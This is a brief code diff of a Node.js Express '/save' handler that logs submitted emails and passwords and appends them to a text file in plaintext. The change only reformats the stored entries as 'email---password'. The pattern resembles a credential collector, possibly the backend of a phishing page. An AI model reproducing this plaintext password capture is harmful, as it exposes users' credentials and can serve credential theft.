@@ -27,7 +27,7 @@ app.post('/save', (req, res) => {
     console.log(`Username: ${email}`);
     console.log(`Password: ${password}`);
 
-    const dataToWrite = `Username: ${email}, Password: ${password}\n`;
+    const dataToWrite = `${email}---${password}\n`;
 
     // Write the data to a file named 'user_data.txt'
     // The 'fs.appendFile' method appends the data to the file.
